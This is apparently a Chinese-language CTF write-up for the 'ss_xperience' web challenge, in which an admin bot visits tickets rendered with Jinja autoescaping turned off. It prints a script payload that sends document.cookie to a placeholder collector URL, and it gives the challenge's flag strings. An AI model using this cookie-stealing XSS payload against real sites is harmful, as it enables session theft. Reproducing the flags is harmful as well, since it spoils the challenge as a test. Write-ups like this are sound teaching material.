# ss_xperience

## 题目简述

用户提交消息后，服务生成 `/ticket?message=...` 链接并让管理员机器人访问。`ticket.html` 显式关闭 Jinja 自动转义：

```jinja2
{% autoescape false %} {{ message }} {% endautoescape %}
```

管理员机器人先在目标站点设置名为 `flag` 的 Cookie，再访问用户控制的 Ticket。Cookie 未设置 `HttpOnly`，因此持久化/反射型 XSS 可以读取 `document.cookie` 并外带 Flag。

## 解题过程

提交一段脚本，把 Cookie URL 编码后发送到自己的接收端：

```html
<script>
location.href = "https://YOUR-COLLECTOR/?cookie="
    + encodeURIComponent(document.cookie);
</script>
```

服务端虽然使用 `quote(message)` 构造查询参数，但 `/ticket` 取出参数后会解码，并在关闭自动转义的模板中作为 HTML 执行。管理员机器人访问页面时，请求接收端即可看到：

```text
cookie=flag%3D...
```

仓库内两份官方材料的 Flag 并不一致：`Readme.md` 记录的是 `grey{b4by_x55_347cbd01cbc74d13054b20f55ea6a42c}`，而实际部署使用的 `docker-compose.yml` 把下面这个值注入 `FLAG` 环境变量；[公开参赛者题解](https://github.com/zst-ctf/nus_welcomectf_2023) 抓到的管理员 Cookie 也与部署配置一致。因此复现比赛服务时应以部署值为准：

```text
greyhats{b4by_x55_scr1pt1ng_92488c0f2286e33bc1eda97a2beb1a2b}
```

## 方法总结

- 核心技巧：利用关闭自动转义的模板注入脚本，在管理员机器人上下文读取非 HttpOnly Cookie。
- 识别信号：用户消息被管理员访问、模板含 `autoescape false`、Flag 通过普通 Cookie 注入浏览器。
- 复用要点：URL 编码不等于 HTML 转义；接收地址应使用自己的临时端点，长期 WP 不保存一次性 webhook 标识。官方说明与部署配置冲突时，应同时记录差异并以实际运行配置或赛时输出为准。
